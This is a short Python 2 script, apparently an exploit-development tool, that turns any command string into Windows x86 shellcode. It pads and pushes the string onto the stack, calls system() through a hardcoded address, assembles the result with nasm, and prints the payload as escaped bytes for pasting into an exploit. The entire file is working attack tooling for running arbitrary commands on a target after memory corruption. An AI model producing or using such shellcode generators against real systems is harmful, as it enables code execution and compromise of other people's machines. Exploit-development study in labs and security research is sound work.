from binascii import unhexlify
import binascii
import sys
import os
from shell import shell
import time


if len (sys.argv) != 2 :
    print "\r"
    print "Creates x86 System() Shellcode"
    print "Usage: python winsystem.py 'echo A>%tmp%\\xx.txt'\r\n"
    print "Adds null bytes if not divisble by 4(you want this)"
    sys.exit (1)

command = sys.argv[1]
shellcommand = binascii.hexlify(command)

def reverse_bytes(Shellcode):
	ShellcodeSize = ''
	ShellcodeSize = [Shellcode[i:i+2] for i in range(0, len(Shellcode), 2)]
	if len(ShellcodeSize) % 4 != 0:
        	print "Shellcode size is not divisible by 4"
		time.sleep(1)
        	NOP = '90'
	
		if ((len(ShellcodeSize))+1) % 4 == 0:
			Shellcode += "00"
			time.sleep(1)		
		elif ((len(ShellcodeSize))+2) % 4 == 0:
			Shellcode += "90"
			Shellcode += "90"
			print "Padding shellcode with 2 NOPS.."
			time.sleep(1)
		else:
			Shellcode += "90"
			Shellcode += "90"
			Shellcode += "90"
			print "Padding shellcode with 3 NOPS.."
			time.sleep(1)
	else:
		print " Shellcode size is divisible by 4"
		time.sleep(1)
		pass

	Shellcode = "".join(([Shellcode[i:i+2] for i in range(0, len(Shellcode), 2)]))
	ShellcodeFormatted = reversed([Shellcode[i:i+8] for i in range(0, len(Shellcode), 8)])
	# ShellcodeFormatted = ([Shellcode[i:i+8] for i in range(0, len(Shellcode), 8)])
	push = ""
	for item in ShellcodeFormatted:
		item = "".join(map(str.__add__, item[-2::-2] ,item[-1::-2]))
		push += "push 0x%s\r\n" % item
	return push


shellasm = """
[BITS 32]

%s
MOV EDI,ESP ;adding a pointer to the stack
PUSH EDI
MOV EAX,0x760c804b ; might need to modify. System() function using hardcoded address
CALL EAX
""" % reverse_bytes(shellcommand)
print "Writing to template...\n%s " % reverse_bytes(shellcommand)

file = open("shellcode.asm","wb")
file.write(shellasm)
file.close()

writeasm = shell('nasm shellcode.asm')
print "Creating shellcode..."

bindshell = 'winexec = "'
length = 0
with open("shellcode", "rb") as f:
    byte = f.read(1)
    while byte != "":
        if len(byte) > 0:
            bindshell += '\\x' + '%02.X' % ord(byte)
            length += 1
        byte = f.read(1)
bindshell += '"'
print "Length: %s bytes\n " % str(length)
print bindshell
# clearbin = shell('rm shellcode')
# clearasm = shell('rm shellcode.asm')
        
